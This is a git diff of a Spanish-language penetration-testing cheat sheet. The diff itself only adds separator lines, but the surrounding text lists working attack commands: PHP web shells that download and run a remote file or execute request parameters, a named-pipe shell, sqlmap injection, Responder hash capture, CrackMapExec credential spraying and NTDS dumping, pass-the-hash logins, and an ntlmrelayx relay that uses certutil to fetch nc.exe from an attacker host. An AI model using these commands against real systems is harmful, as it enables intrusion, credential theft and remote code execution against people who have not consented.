@@ -303,6 +303,7 @@ mkfifo input; tail -f input | /bin/bash > output
 <?php system("wget http://ip/file -o /tmp/file.php; php /tmp/file.php");?>
 <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";?>
 ```
+
 ---
 #### Tmux
 tmux new -s "nombre"
@@ -319,6 +320,7 @@ prefix + ! --> *mueve el panel activo a una nueva ventana*
 
 prefix + [ --> *para buscar texto*
 
+---
 #### Tmux copy mode
 prefix + [
 
@@ -345,6 +347,7 @@ sqlmap -u URL --method POST --data "username=FUZZ&password=" -P username --dbs -
 #### Responder
 python Responder.py -I INTERFACE -rdw  *para capturar Hashes NetNTLM-v2*
 
+---
 #### CrackmapExec
 crackmapexec smb IP/CIDR -u 'USUARIO' -p 'PASSWORD'
 
@@ -360,14 +363,17 @@ crackmapexec smb IP -u 'Administrator' -p 'PASS' --ntds vss
 
 crackmapexec smb IP - u 'USUARIO' -p FILE
 
+---
 #### PSexec
 python3 psexec.py DOMAIN/USER:PASS cmd.exe
 
+---
 #### PTH-WINEXE
 pth-winexe -U DOMINIO/USUARIO%PASS //IP cmd.exe
 
 pth-winexe -U DOMINIO/Administrator%HASH:HASH //IP cmd.exe
 
+---
 #### Responder-ntlmrelayx
 responder.conf  *smb OFF + http OFF*
 
@@ -377,6 +383,7 @@ python3 ntlmrelayx.py -tf targets.txt -smb2support
 
 python Responder.py -I INTERFACE -rdw
 
+---
 #### Responder-ntlmrelayx con smbserver
 python3 ntlmrelayx.py -tf targets.txt -c "certutil.exe -f -urlcache -split IP:PUERTO/nc.exe C:\Windows\Temp\nc.exe"-smb2support
 
